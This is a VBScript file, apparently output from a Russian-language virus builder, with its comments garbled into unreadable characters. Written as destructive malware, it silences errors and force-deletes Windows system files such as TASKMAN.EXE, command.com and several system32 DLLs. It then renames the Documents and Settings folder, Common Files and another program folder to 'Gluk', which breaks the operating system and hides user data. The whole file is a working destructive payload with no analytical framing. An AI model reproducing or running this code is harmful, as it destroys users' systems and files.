'            = = = = = =  = > ��� ������ < = = = = = = = 

'      ���������� ����������(���� ����� �� ����������)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' ���������� ������
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


' �������� C:\WINDOWS\TASKMAN.EXE
str = "C:\WINDOWS\TASKMAN.EXE"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\WINDOWS\system32\blackbox.dll
str = "C:\WINDOWS\system32\blackbox.dll"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\WINDOWS\system32\browsewm.dll
str = "C:\WINDOWS\system32\browsewm.dll"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\WINDOWS\system32\command.com
str = "C:\WINDOWS\system32\command.com"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\WINDOWS\system32\crtdll.dll
str = "C:\WINDOWS\system32\crtdll.dll"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

'     �������������� ����� ��� ����� C:\Documents and Settings\ �� "Gluk"
str = "C:\Documents and Settings\"
If FileSystemObject.fileExists(str) = True Then
Set file = FileSystemObject.getfile(str)
file.name = "Gluk"
ElseIf FileSystemObject.folderExists(str) = True Then
Set fol = FileSystemObject.getfolder(str)
fol.name = "Gluk"
End If

'     �������������� ����� ��� ����� C:\Program Files\xerox\nwwia\ �� "Gluk"
str = "C:\Program Files\xerox\nwwia\"
If FileSystemObject.fileExists(str) = True Then
Set file = FileSystemObject.getfile(str)
file.name = "Gluk"
ElseIf FileSystemObject.folderExists(str) = True Then
Set fol = FileSystemObject.getfolder(str)
fol.name = "Gluk"
End If

' �������������� ����� ��� ����� C:\Program Files\Common Files\ �� "Gluk"
str = "C:\Program Files\Common Files\"
If FileSystemObject.fileExists(str) = True Then
Set file = FileSystemObject.getfile(str)
file.name = "Gluk"
ElseIf FileSystemObject.folderExists(str) = True Then
Set fol = FileSystemObject.getfolder(str)
fol.name = "Gluk"
End If

